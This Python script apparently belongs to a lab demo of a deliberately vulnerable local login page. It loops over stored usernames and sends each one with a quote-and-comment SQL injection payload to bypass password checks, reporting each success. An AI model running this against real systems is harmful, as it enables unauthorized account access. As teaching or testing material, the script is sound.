import sqlite3
from pathlib import Path

import requests


LOGIN_URL = "http://127.0.0.1:5000/vulnerable/login"
DB_PATH = Path(__file__).resolve().parents[1] / "users.db"


def load_usernames() -> list[str]:
    conn = sqlite3.connect(DB_PATH)
    try:
        rows = conn.execute("SELECT username FROM users ORDER BY id").fetchall()
    finally:
        conn.close()
    return [row[0] for row in rows]


def attempt_login_as(username: str) -> bool:
    payload = f"{username}' -- "
    data = {"username": payload, "password": "wrong-password"}

    try:
        response = requests.post(LOGIN_URL, data=data, allow_redirects=False, timeout=5)
    except requests.RequestException as exc:
        print(f"[ERROR] {username}: request failed: {exc}")
        return False

    location = response.headers.get("Location", "")
    if response.is_redirect and location.endswith("/dashboard"):
        print(f"[SUCCESS] {username}: redirected to /dashboard with payload {payload!r}")
        return True

    # Current demo app also exposes a row marker on successful query match.
    if response.status_code == 200 and "Query matched user row:" in response.text:
        print(f"[SUCCESS] {username}: login matched a row with payload {payload!r}")
        return True

    print(f"[FAILURE] {username}: payload {payload!r} did not bypass login")
    return False


def main() -> None:
    print(f"Target: {LOGIN_URL}")
    print(f"Source users DB: {DB_PATH}")

    usernames = load_usernames()
    print(f"Testing usernames: {', '.join(usernames)}")

    successes = [username for username in usernames if attempt_login_as(username)]

    if successes:
        print(f"\nSucceeded for: {', '.join(successes)}")
    else:
        print("\nNo username-specific bypass succeeded.")


if __name__ == "__main__":
    main()
